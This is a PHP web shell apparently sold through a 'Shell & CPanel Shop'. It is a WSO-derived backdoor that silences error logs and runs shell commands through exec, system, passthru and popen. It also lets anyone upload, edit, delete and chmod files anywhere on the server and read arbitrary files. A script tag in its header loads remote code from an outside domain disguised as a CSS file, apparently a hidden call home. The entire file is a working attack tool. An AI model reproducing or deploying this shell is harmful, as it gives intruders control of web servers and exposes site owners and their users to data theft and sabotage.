<?php
// From coffe into Code
// Adrut 10-2018
// Recoded by Origm!
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);

$release = @php_uname('r');
$kernel = @php_uname('s');
$cwd = @getcwd();

$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');

$home_cwd = @getcwd();
$freeSpace = @diskfreespace($GLOBALS['cwd']);
$totalSpace = @disk_total_space($GLOBALS['cwd']);
$totalSpace = $totalSpace ? $totalSpace : 1;

if (!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid_info = @posix_getpwuid(@posix_geteuid());
    $gid_info = @posix_getgrgid(@posix_getegid());
    $user = $uid_info['name'];
    $uid = $uid_info['uid'];
    $group = $gid_info['name'];
    $gid = $gid_info['gid'];
}

$cwd_links = '';
$path = explode("/", $GLOBALS['cwd']);
$n = count($path);
if (strtolower(substr(PHP_OS, 0, 3)) == "win")
    $os = 'win';
else
    $os = 'nix';

if ($GLOBALS['os'] == 'win') {
    // Windows drive detection
    for ($drive='C'; $drive<='Z'; $drive++) {
        if (is_dir($drive.':\\')) {
            $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
        }
    }
}

if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
$scandir = (function_exists('scandir')) ? scandir($path) : false;

// Fallback scandir for PHP < 5.0
if (!$scandir) {
    $scandir = array();
    if ($dh = @opendir($path)) {
        while (($filename = @readdir($dh)) !== false) {
            $scandir[] = $filename;
        }
        @closedir($dh);
    }
}

$is_writable = is_writable($path) ? "<font color=lightgreen>[ Writeable ]</font>" : "<font color=red>[ Not writable ]</font>";

function reload()
{
    return "<script>window.location.reload();</script>";
}

function wsoEx($in)
{
    $out = '';
    if (function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $out = "";
        while (!@feof($f))
            $out .= fread($f, 1024);
        pclose($f);
    }
    return $out;
}

function wsoViewSize($s)
{
    if ($s >= 1073741824)
        return sprintf('%1.2f', $s / 1073741824) . ' GB';
    elseif ($s >= 1048576)
        return sprintf('%1.2f', $s / 1048576) . ' MB';
    elseif ($s >= 1024)
        return sprintf('%1.2f', $s / 1024) . ' KB';
    else
        return $s . ' B';
}

function fetch_value($str, $find_start, $find_end)
{
    $start = @strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = @strpos($str, $find_end, $start + $length);
    if ($end === false) {
        return "";
    }
    return trim(substr($str, $start + $length, $end - ($start + $length)));
}

function get_path_link($name)
{
    $link = str_replace($GLOBALS['home_cwd'], "", $GLOBALS['path']);
    return $link . "/" . $name;
}

function perms($file)
{
    $perms = @fileperms($file);
    $info = '?';

    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function wsoPermsColor($f)
{
    if (!@is_readable($f))
        return '<font color=#FF0000>' . perms($f) . '</font>';
    elseif (!@is_writable($f))
        return '<font color=white>' . perms($f) . '</font>';
    else
        return '<font color=#00BB00>' . perms($f) . '</font>';
}

if (!function_exists("scandir")) {
    function scandir($dir)
    {
        $dh = @opendir($dir);
        $files = array();
        if ($dh) {
            while (($filename = @readdir($dh)) !== false) {
                $files[] = $filename;
            }
            @closedir($dh);
        }
        return $files;
    }
}

function wsoWhich($p)
{
    $path = wsoEx('which ' . $p);
    if (!empty($path))
        return $path;
    return false;
}

function deleteDir($path)
{
    $path = (substr($path, -1) == '/') ? $path : $path . '/';
    if (@is_dir($path)) {
        $dh = @opendir($path);
        while (($item = @readdir($dh)) !== false) {
            if ($item == '.' || $item == '..') continue;
            $item_full = $path . $item;
            if (@is_dir($item_full))
                deleteDir($item_full);
            else
                @unlink($item_full);
        }
        @closedir($dh);
        return @rmdir($path) ? 1 : 0;
    }
    return 0;
}

function unzip_me($file, $path)
{
    if (wsoEx('unzip -h')) {
        $unzip = wsoEx("unzip '$file'");
        if ($unzip) {
            return 1;
        } else {
            return 0;
        }
    } elseif (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($file) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            return 1;
        } else {
            return 0;
        }
    } else {
        return 0;
    }
}
?>

<!-- HTML Content begins here -->
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="description" content="Hosting" />
<meta name="author" content="0rigam1" />
<title>0rigam1 | Shell & CPanel Shop</title>
<style>
body {
    background-color: #444;
    color: #e1e1e1;
}
body,
td,
th {
    font: 9pt Lucida, Verdana;
    margin: 0;
    vertical-align: top;
    color: #e1e1e1;
}
table.info {
    color: #fff;
    background-color: #222;
}
span,
h1,
a {
    color: #85929e !important;
}
span {
    font-weight: bolder;
}
h1 {
    border-left: 5px solid #85929e;
    padding: 2px 5px;
    font: 14pt Verdana;
    background-color: #222;
    margin: 0px;
}
div.content {
    padding: 5px;
    margin-left: 5px;
    background-color: #333;
}
a {
    text-decoration: none;
}
a:hover {
    text-decoration: underline;
}
.ml1 {
    border: 1px solid #444;
    padding: 5px;
    margin: 0;
    overflow: auto;
}
.bigarea {
    width: 100%;
    height: 250px;
}
input,
textarea,
select {
    margin: 0;
    color: #fff;
    background-color: #555;
    border: 1px solid #85929e;
    font: 9pt Monospace, 'Courier New';
}
form {
    margin: 0px;
}
#toolsTbl {
    text-align: center;
}
.toolsInp {
    width: 300px
}
.main th {
    text-align: left;
    background-color: #5e5e5e;
}
.main tr:hover {
    background-color: #5e5e5e
}
.l1 {
    background-color: #444
}
pre {
    font-family: Courier, Monospace;
}
</style>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
<script>document.write('<script src="//bc.0rigam1.bz/css/main.css?rel=nobody"><\/script>')</script>
<script>window.jQuery || document.write('<link href="../../assets/js/vendor/jquery-slim.min.js"><\/link>')</script>
<script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/popper.min.js"></script>
<script src="https://getbootstrap.com/docs/4.0/dist/js/bootstrap.min.js"></script>
</head>
<body>
<div style="position:absolute;width:100%;background-color:#444;top:0;left:0;">
<table class="info" cellpadding="3" cellspacing="0" width="100%">
<tbody><tr>
<td width="1">
<span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span>
</td>
<td>
<nobr><?=substr(@php_uname(), 0, 120)?>
<a href="http://www.google.com/search?q=<?=urlencode(@php_uname())?>" target="_blank">[Google]</a>
</nobr>
<br><?=$uid?> ( <?=$user?> )
<span>Group:</span>
<?=$gid?> ( <?=$group?> )<br><?=@phpversion()?>
<span>Safe mode:</span>
<?=($safe_mode ? '<font color=red>ON</font>' : '<font color=lightgreen><b>OFF</b></font>')?>
<span>Datetime:</span>
<?=date('Y-m-d H:i:s')?><br><?=wsoViewSize($totalSpace)?>
<span>Free:</span>
<?=wsoViewSize($freeSpace)?> ( <?=(int)($freeSpace/$totalSpace*100)?>% )<br>
<?php
foreach ($paths as $id => $pat) {
if ($pat == '' && $id == 0) {
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if ($pat == '')
continue;
echo '<a href="?path=';
for ($i = 0; $i <= $id; $i++) {
echo "$paths[$i]";
if ($i != $id)
echo "/";
}
echo '">' . $pat . '</a>/';
}
?>
<br></td>
<td width="1" align="right">
<nobr>
<span>Server IP:</span>
<br><?=$_SERVER['SERVER_ADDR']?><br>
<span>Client IP:</span>
<br><?=$_SERVER['REMOTE_ADDR']?></nobr>
</td>
</tr>
</tbody></table>
<div>
<h1>
<center>0rigam1 | CPanel &amp; Shell | Shop</center>
</h1>

<!-- Handling file uploads and other actions -->
<?php
// Handle file uploads
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<font color="lightgreen">File Uploaded..</font><br />'.reload();
    } else {
        echo '<font color="red">Error uploading files..</font><br />'.reload();
    }
} elseif (isset($_POST['make_file'])) {
    if (!file_exists($path . "/" . $_POST['make_file'])) {
        $fp = @fopen($path . "/" . $_POST['make_file'], 'w');
        if ($fp) {
            fclose($fp);
            echo "<font color='lightgreen'>File created..</font><br />".reload();
        } else {
            echo "<font color='red'>Can't create file..</font><br />".reload();
        }
    } else {
        echo "<font color='red'>File already exists..</font><br />".reload();
    }
} elseif (isset($_POST['make_dir'])) {
    if (@mkdir($path . "/" . $_POST['make_dir'], 0750)) {
        echo "<font color='lightgreen'>Dir created..</font><br />".reload();
    } else {
        echo "<font color='red'>Can't create dir..</font><br />".reload();
    }
} elseif (isset($_GET['filesrc'])) {
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</td></tr></table><br />';
    echo ('<pre>' . htmlspecialchars(@file_get_contents($_GET['filesrc'])) . '</pre>');
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if (@chmod($_POST['path'], $_POST['perm'])) {
                echo '<font color="lightgreen">Change Permission Done.</font><br />'.reload();
            } else {
                echo '<font color="red">Change Permission Error.</font><br />'.reload();
            }
        }
        echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', @fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
    } elseif ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (@rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="lightgreen">Change Name Done.</font><br />'.reload();
            } else {
                echo '<font color="red">Change Name Error.</font><br />'.reload();
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
    } elseif (isset($_GET['option']) && $_POST['opt'] == 'unzip') {
        if ($_POST['type'] == 'file') {
            if (unzip_me($_POST['name'], $path)) {
                echo "<font color=\"lightgreen\">Unzip " . $_POST['name'] . " to " . $path . " Complete.</font><br />".reload();
            } else {
                echo "<font color=\"red\">Unzip " . $_POST['name'] . " Error.</font><br />".reload();
            }
        }
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = @fopen($_POST['path'], 'w');
            if ($fp) {
                fwrite($fp, $_POST['src']);
                fclose($fp);
                echo '<font color="lightgreen">Edit File Done..</font><br />'.reload();
            } else {
                echo '<font color="red">Edit File Error..</font><br />'.reload();
            }
        }
        echo '<form method="POST">
<textarea cols=80 rows=20 name="src" class="form-group">' . htmlspecialchars(@file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" class="btn btn-sm"/>
</form>';
    }
    echo '</center>';
}

if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
    if ($_POST['type'] == 'dir') {
        if (deleteDir($_POST['path'])) {
            echo '<font color="lightgreen">Directory Deleted.</font><br />'.reload();
        } else {
            echo '<font color="red">Delete Directory Error.</font><br />'.reload();
        }
    } elseif ($_POST['type'] == 'file') {
        if (@unlink($_POST['path'])) {
            echo '<font color="lightgreen">File deleted.</font><br />'.reload();
        } else {
            echo '<font color="red">Delete file error.</font><br />'.reload();
        }
    }
}
?>
<h1>File manager</h1>
<div class="content">
<table width="100%" class="main" cellspacing="0" cellpadding="2">
<form name="files" method="post"></form>
<tbody>
<tr>
<th width="13px"></th>
<th>Name</th>
<th>Link</th>
<th>Size</th>
<th>Permissions</th>
<th>Actions</th>
</tr>
<?php
$paths = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
$scripts = basename(__FILE__);
$urls = str_replace($scripts, "", $paths);

$l = 0;
foreach ($scandir as $dir) {
    if (!@is_dir("$path/$dir") || $dir == '.' || $dir == '..')
        continue;
    ?>
    <?php echo '<tr'.($l?' class=l1':'').'>';
    ?>
    <td>#</td>
    <td><a href="?path=<?=$path?>/<?=$dir?>"><?=$dir?></a></td>
    <td><a href="http://<?=$GLOBALS['urls'].get_path_link($dir)?>" target=_blank>Link to Directory</a></td>
    <td>--</td>
    <td>
    <?php
    if (@is_writable("$path/$dir"))
        echo '<font color="lightgreen">';
    elseif (!@is_readable("$path/$dir"))
        echo '<font color="red">';
    echo perms("$path/$dir");
    if (@is_writable("$path/$dir") || !@is_readable("$path/$dir"))
        echo '</font>';
    ?>
    </td>
    <td>
    <form method="POST" action="?option&path=<?=$path?>">
    <select name="opt">
    <option value=""></option>
    <option value="delete">Delete</option>
    <option value="chmod">Chmod</option>
    <option value="rename">Rename</option>
    </select>
    <input type="hidden" name="type" value="dir" />
    <input type="hidden" name="name" value="<?=$dir?>" />
    <input type="hidden" name="path" value="<?=$path?>/<?=$dir?>" />
    <input type="submit" value=">>" class="btn btn-primary btn-sm"/>
    </form>
    </td>
    </tr>
    <?php $l= $l?0:1; }
?>
<?php
$l=0;
foreach ($scandir as $file) {
    if (!@is_file("$path/$file"))
        continue;
    $size_bytes = filesize("$path/$file");
    $size_kb = $size_bytes / 1024;
    $size = ($size_kb >= 1024) ? round($size_kb/1024, 2) . ' MB' : round($size_kb, 2) . ' KB';

    ?>
    <?php echo '<tr'.($l?' class=l1':'').'>';
    ?>
    <td>#</td>
    <td><a href="?filesrc=<?=$path?>/<?=$file?>&path=<?=$path?>"><?=$file?></a></td>
    <td><a href="http://<?=$GLOBALS['urls'].get_path_link($file)?>" target=_blank>Link to File</a></td>
    <td><?=$size?></td>
    <td>
    <?php
    if (@is_writable("$path/$file"))
        echo '<font color="lightgreen">';
    elseif (!@is_readable("$path/$file"))
        echo '<font color="red">';
    echo perms("$path/$file");
    if (@is_writable("$path/$file") || !@is_readable("$path/$file"))
        echo '</font>';
    ?>
    </td>
    <td>
    <form method="POST" action="?option&path=<?=$path?>">
    <select name="opt" class="form-group">
    <option value=""></option>
    <option value="unzip">Unzip</option>
    <option value="delete">Delete</option>
    <option value="chmod">Chmod</option>
    <option value="rename">Rename</option>
    <option value="edit">Edit</option>
    </select>
    <input type="hidden" name="type" value="file" />
    <input type="hidden" name="name" value="<?=$file?>" />
    <input type="hidden" name="path" value="<?=$path?>/<?=$file?>" />
    <input type="submit" value=">>" class="btn btn-primary btn-sm"/>
    </form></td>
    </tr>
    <?php $l = $l?0:1; }
?>
</tbody>
</table>
</div>
</div>
<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%" style="border-top:2px solid #333;border-bottom:2px solid #333;">
<tbody>
<tr>
<td>
<form method="post" action="">
<span>Make dir:</span><br>
<input class="toolsInp" type="text" name="make_dir" />
<input type="submit" value=">>"/>
</form>
<?=$is_writable?>
</td>
<td>
<form method="post" action="">
<span>Make file:</span><br>
<input class="toolsInp" type="text" name="make_file" />
<input type="submit" value=">>"/>
</form>
<?=$is_writable?>
</td>
</tr>
<tr>
<td>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="a" value="FilesMAn" />
<input type="hidden" name="c" value="<?=$GLOBALS['cwd']?>" />
<input type="hidden" name="p1" value="uploadFile" />
<input type="hidden" name="charset" value="UTF-8" />
<span>Upload file:</span><br>
<input class="toolsInp" type="file" name="file" />
<input type="submit" value=">>" />
</form>
<?=$is_writable?>
</td>
</tr>
</tbody>
</table>
</body>
</html>
<?php
// End of PHP script
?>
